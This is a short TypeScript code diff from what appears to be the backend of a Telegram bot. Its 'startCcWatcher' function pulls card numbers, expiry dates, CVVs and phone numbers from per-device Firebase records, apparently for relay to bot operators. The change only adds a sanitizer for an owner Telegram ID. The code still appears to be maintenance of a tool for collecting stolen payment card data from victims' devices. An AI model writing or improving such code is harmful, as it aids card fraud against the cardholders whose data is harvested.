@@ -11,6 +11,7 @@
  * We watch BOTH.
  */
 import { escapeMarkdown } from "../lib/telegramText";
+import { sanitizeOwnerTelegramId } from "../lib/telegramIds";
 import { Telegraf } from "telegraf";
 import { logger } from "../lib/logger";
 import { fbGet, getCcWatermarks, setCcWatermark } from "./firebase";
@@ -63,7 +64,9 @@ export function startCcWatcher(bot: Telegraf, adminId: number): void {
         const expiry      = device?.cc_expiry  || device?.expiry  || "?";
         const cvv         = device?.cc_cvv     || device?.cvv     || "?";
         const ccTimestamp = device?.cc_timestamp || device?.timestamp || null;
-        const ownerTelegramId: string | null = device?.ownerTelegramId || null;
+        const ownerTelegramId: string | null = sanitizeOwnerTelegramId(
+          device?.ownerTelegramId
+        );
         const phone = device?.mobNo || device?.phone || deviceId;
 
         if (!cardNumber || !ccTimestamp) continue; // no CC data yet
